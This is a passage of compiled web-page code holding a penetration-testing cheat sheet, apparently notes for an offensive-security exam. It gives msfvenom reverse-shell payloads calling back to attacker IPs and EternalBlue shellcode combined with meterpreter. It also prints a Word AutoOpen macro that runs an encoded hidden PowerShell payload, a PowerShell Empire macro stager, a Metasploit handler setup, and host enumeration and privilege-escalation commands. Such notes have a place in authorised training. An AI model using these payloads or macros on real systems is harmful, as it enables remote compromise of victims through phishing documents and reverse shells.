operator"}},[s._v("<")]),s._v("windows-machine-ip"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("/"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("file-name"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])])]),t("h4",{attrs:{id:"netcat"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#netcat"}},[s._v("#")]),s._v(" Netcat")]),s._v(" "),t("p",[s._v("In command prompt:")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("C:\\tools\\practical_tools\\nc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("nvlp 4455 > C:\\Users\\offset\\Desktop\\binary"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe\n")])])]),t("p",[s._v("In linux machine:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("windows_ip_here"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4455")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v(" binary.exe\n")])])]),t("h3",{attrs:{id:"linux-to-linux"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#linux-to-linux"}},[s._v("#")]),s._v(" Linux to linux")]),s._v(" "),t("h4",{attrs:{id:"wget"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#wget"}},[s._v("#")]),s._v(" Wget")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.102:9999/file.txt\n")])])]),t("h4",{attrs:{id:"curl"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#curl"}},[s._v("#")]),s._v(" Curl")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-O")]),s._v(" http://192.168.0.101/file.txt\n")])])]),t("h2",{attrs:{id:"interactive-shells"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#interactive-shells"}},[s._v("#")]),s._v(" Interactive shells")]),s._v(" "),t("h3",{attrs:{id:"semi-interactive"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#semi-interactive"}},[s._v("#")]),s._v(" Semi-interactive")]),s._v(" "),t("p",[s._v("Getting a semi-interactive shells is simple:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("python "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'import pty; pty.spawn(\"/bin/bash\")'")]),s._v("\n")])])]),t("h3",{attrs:{id:"fully-interactive-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#fully-interactive-shell"}},[s._v("#")]),s._v(" Fully interactive shell")]),s._v(" "),t("p",[s._v("First, run the semi-interactive shell python command, then background the current shell process, run "),t("code",[s._v("stty raw -echo")]),s._v(" in the terminal which will pass keyboard shortcuts through, then run "),t("code",[s._v("fg")]),s._v(" to bring netcat back.")]),s._v(" "),t("h2",{attrs:{id:"msfvenom"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msfvenom"}},[s._v("#")]),s._v(" Msfvenom")]),s._v(" "),t("h3",{attrs:{id:"windows-exe-staged-payload-needs-metasploit-to-catch-allowed-on-exam"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#windows-exe-staged-payload-needs-metasploit-to-catch-allowed-on-exam"}},[s._v("#")]),s._v(" Windows exe staged_payload (needs metasploit to catch, "),t("strong",[s._v("allowed on exam")]),s._v(")")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.11")]),s._v(".0.4 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5555")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" exe "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" binary.exe\n")])])]),t("h3",{attrs:{id:"powershell-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#powershell-2"}},[s._v("#")]),s._v(" Powershell")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".119.194 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5555")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" powershell\n")])])]),t("h3",{attrs:{id:"combining-payloads"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#combining-payloads"}},[s._v("#")]),s._v(" Combining payloads")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("nasm "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" bin eternalblue_x64_kshellcode.asm "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" sc_x64_kernel.bin\nmsfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/x64/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" raw "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" sc_x64_msf.bin "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".254.142 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" sc_x64_kernel.bin sc_x64_msf.bin "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" sc_x64.bin\n")])])]),t("h2",{attrs:{id:"windows-tips-tricks"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#windows-tips-tricks"}},[s._v("#")]),s._v(" Windows tips & tricks")]),s._v(" "),t("h3",{attrs:{id:"changing-execution-policy"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#changing-execution-policy"}},[s._v("#")]),s._v(" Changing execution policy")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("Set-ExecutionPolicy "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-ExecutionPolicy")]),s._v(" Unrestricted "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Scope")]),s._v(" CurrentUser\nGet-ExecutionPolicy "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Scope")]),s._v(" CurrentUser\n")])])]),t("h2",{attrs:{id:"microsoft-word-macro-payload"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#microsoft-word-macro-payload"}},[s._v("#")]),s._v(" Microsoft-word macro payload")]),s._v(" "),t("p",[s._v("First create an "),t("code",[s._v("evil.hta")]),s._v(" file like so:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# recommended")]),s._v("\nmsfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".119.194 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" vba-psh "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" payload.txt\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# or")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.11")]),s._v(".0.4 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" hta-psh "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" /var/www/html/evil.hta \n")])])]),t("p",[s._v("Next create a new macro and copy-paste the file into the macro")]),s._v(" "),t("p",[s._v("Finally create a word macro and past the shell code in like so:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("Sub AutoOpen"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    MyMacro\nEnd Sub\n\nSub Document_Open"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    MyMacro\nEnd Sub\n\nSub MyMacro"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    Dim Str As String\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"')]),s._v("\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"')]),s._v("\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"')]),s._v("\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"')]),s._v("\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"')]),s._v("\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"')]),s._v("\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"')]),s._v("\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"')]),s._v("\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"')]),s._v("   \n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"')]),s._v("\n    Str "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Str + "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"QA="')]),s._v(" \n    \n    CreateObject"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Wscript.Shell"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".Run Str \nEnd Sub\n")])])]),t("p",[s._v("Now save the file as either a "),t("code",[s._v("docm")]),s._v(" file type or a "),t("code",[s._v("doc")]),s._v(" (older) file type")]),s._v(" "),t("p",[t("strong",[s._v("ALTERNATIVELY")])]),s._v(" "),t("p",[s._v("we can use powershell empire")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" listeners\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire: listeners"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" uselistener http\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire: listeners/http"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" Host "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".119.194\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire: listeners/http"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" Name exploit\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire: listeners/http"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" execute\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Starting listener "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'exploit'")]),s._v("\n * Serving Flask app "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("lazy loading"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n * Environment: production\n   WARNING: This is a development server. Do not use it "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" a production deployment.\n   Use a production WSGI server instead.\n * Debug mode: off\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Listener successfully started"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire: listeners/http"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" back\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire: listeners"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" usestager windows/macro\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire: stager/windows/macro"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" listeners\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Active listeners:\n\n  Name              Module          Host                                 Delay/Jitter   KillDate\n  ----              ------          ----                                 ------------   --------\n  exploit           http            http://192.168.119.194:80            "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v("/0.0                  \n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire: stager/windows/macro"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" Listener exploit\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Empire: stager/windows/macro"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" execute\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Stager output written out to: /tmp/macro\n")])])]),t("p",[s._v("Check if macro was embedded using `olevba word_macro.doc from "),t("a",{attrs:{href:"https://github.com/decalage2/oletools",target:"_blank",rel:"noopener noreferrer"}},[s._v("oletools"),t("OutboundLink")],1)]),s._v(" "),t("h2",{attrs:{id:"metasploit-framework"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#metasploit-framework"}},[s._v("#")]),s._v(" Metasploit framework")]),s._v(" "),t("h3",{attrs:{id:"windows-reverse-meterpreter-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#windows-reverse-meterpreter-shell"}},[s._v("#")]),s._v(" Windows reverse meterpreter shell")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfconsole "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-x")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"use exploit/multi/handler"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" RHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".194.10"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" PAYLOAD windows/meterpreter/reverse_tcp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".119.194"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LPORT "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5555")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])])]),t("p",[s._v("or")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" msfconsole\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use exploit/multi/handler\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" PAYLOAD windows/meterpreter/reverse_tcp\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".119.194\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LPORT "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5555")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" run\n")])])]),t("h2",{attrs:{id:"device-enumeration"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#device-enumeration"}},[s._v("#")]),s._v(" Device enumeration")]),s._v(" "),t("h3",{attrs:{id:"useful-commands-for-windows-clients"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#useful-commands-for-windows-clients"}},[s._v("#")]),s._v(" Useful commands for windows clients:")]),s._v(" "),t("ul",[t("li",[s._v("View user info: "),t("code",[s._v("net user")])]),s._v(" "),t("li",[s._v("View system info: "),t("code",[s._v("systeminfo")])]),s._v(" "),t("li",[s._v("View routing information: "),t("code",[s._v("route print")])]),s._v(" "),t("li",[s._v("View running services: "),t("code",[s._v("Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}")])]),s._v(" "),t("li",[s._v("View active network connections: "),t("code",[s._v("netstat -ano")])]),s._v(" "),t("li",[s._v("View current firewall profile: "),t("code",[s._v("netsh advfirewall show currentprofile")]),s._v(" "),t("ul",[t("li",[s._v("View all firewall rules: "),t("code",[s._v("netsh advfirewall show rule name=all")])])])]),s._v(" "),t("li",[s._v("View scheduled tasks: "),t("code",[s._v("schtasks /query /fo LIST /v")])]),s._v(" "),t("li",[s._v("View all installed application with version: "),t("code",[s._v("wmic product get name, version, vendor")]),s._v(" "),t("ul",[t("li",[s._v("View system wide updates: "),t("code",[s._v("wmic qfe Caption, Description, HotFixID, InstalledOn")])])])]),s._v(" "),t("li",[s._v("View any file that can be modified by anyone using "),t("strong",[s._v("powershell")]),s._v(": "),t("code",[s._v('Get-ChildItem "C:\\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\\sAllow\\s\\sModify"}')])]),s._v(" "),t("li",[s._v("List all drives that are mounted and non-mounted: "),t("code",[s._v("mountvol")])]),s._v(" "),t("li",[s._v("Gather kernel information in "),t("strong",[s._v("powershell")]),s._v(": "),t("code",[s._v("driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Node', Path")])]),s._v(" "),t("li",[s._v("Gather driver versions ie. vmware: "),t("code",[s._v('Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*Vmware*"}')])]),s._v(" "),t("li",[s._v("Checking if we can run any windows installer with elevated priviledges:\n"),t("ul",[t("li",[t("code",[s._v("reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer")])]),s._v(" "),t("li",[t("code",[s._v("reg query HKEY_CURRENT_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer")])])])])]),s._v(" "),t("h3",{attrs:{id:"for-linux-client-commands-that-can-be-used"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#for-linux-client-commands-that-can-be-used"}},[s._v("#")]),s._v(" For linux client, commands that can be used:")]),s._v(" "),t("ul",[t("li",[s._v("View all processes: "),t("code",[s._v("ps axu")])]),s._v(" "),t("li",[s._v("Check all TCP/IP configurations: "),t("code",[s._v("ip a")])]),s._v(" "),t("li",[s._v("Display network routing table: "),t("code",[s._v("/sbin/route")])]),s._v(" "),t("li",[s._v("Display active network connections: "),t("code",[s._v("ss -anp")])]),s._v(" "),t("li",[s._v("View scheduled tasks: "),t("code",[s._v("ls -lah /etc/cron*")]),s._v(" "),t("ul",[t("li",[s._v("Crontab: "),t("code",[s._v("cat /etc/crontab")])])])]),s._v(" "),t("li",[s._v("Listing installed packages: "),t("code",[s._v("dpkg -l")])]),s._v(" "),t("li",[s._v("Find all directories writable by current user: "),t("code",[s._v("find / -writable -type d 2>/dev/null")])]),s._v(" "),t("li",[s._v("List all mounted file systems: "),t("code",[s._v("mount")]),s._v(" "),t("ul",[t("li",[s._v("static file system: "),t("code",[s._v("cat /etc/fstab")])]),s._v(" "),t("li",[s._v("All available disks: "),t("code",[s._v("/bin/lsblk")])])])]),s._v(" "),t("li",[s._v("Loaded kernel modules: "),t("code",[s._v("lsmod")]),s._v(" "),t("ul",[t("li",[s._v("Find out more about module: "),t("code",[s._v("/sbin/modinfo <module_name>")])])])]),s._v(" "),t("li",[s._v("Find any binaries that can be run as root: "),t("code",[s._v("find / -perm -u=s -type f 2>/dev/null")])])]),s._v(" "),t("h2",{attrs:{id:"privilege-escalation-priv-esc"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#privilege-escalation-priv-esc"}},[s._v("#")]),s._v(" Privilege escalation (Priv esc)")]),s._v(" "),t("h3",{attrs:{id:"windows"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#windows"}},[s._v("#")]),s._v(" Windows")]),s._v(" "),t("ul",[t("li",[s._v("Starting powershell in high-integrity mode: "),t("code",[s._v("powershell Start-Process cmd.exe -Verb runAs")])]),s._v(" "),t("li",[s._v("A lot of windows binaries can be found at "),t("code",[s._v("/usr/share/windows-binaries/")]),s._v(" for kali linux")])]),s._v(" "),t("h4",{attrs:{id:"sherlock"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#sherlock"}},[s._v("#")]),s._v(" Sherlock")]),s._v(" "),t("ul",[t("li",[s._v("Can use sherlock to find priv esc possiblities")])]),s._v(" "),t("h4",{attrs:{id:"finding-system-info"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#finding-system-info"}},[s._v("#")]),s._v(" Finding system info")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("systeminfo "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" findstr /B /C:"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"OS Name"')]),s._v(" /C:"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"OS 